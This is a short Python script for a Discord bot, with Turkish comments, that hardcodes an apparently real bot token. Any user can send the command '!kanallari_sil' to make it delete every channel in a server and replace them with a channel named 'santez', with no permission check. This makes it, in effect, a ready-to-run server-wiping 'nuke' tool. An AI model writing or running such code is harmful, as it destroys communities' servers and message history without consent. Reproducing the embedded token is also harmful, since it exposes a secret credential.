import discord

# Discord bot token
TOKEN = 'MTIyNDAxMjY5NDIwMjYxMzc4MA.GecnXx.m-lq6o4z3bE6_FymtbC2ftj0Fk9a1RRIEArHLk'
# Discord intents
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True

# Discord client
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'{client.user} olarak giriş yapıldı.')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.guild:  # Mesaj bir sunucudan geliyorsa
        if message.content.startswith('!kanallari_sil'):
            # Tüm kanalları al ve sil
            for channel in message.guild.channels:
                await channel.delete()

            # Yeni bir kanal oluştur ve mesaj gönder
            new_channel = await message.guild.create_text_channel('santez')
            await new_channel.send('santez kanalına hoş geldiniz!')

client.run(TOKEN)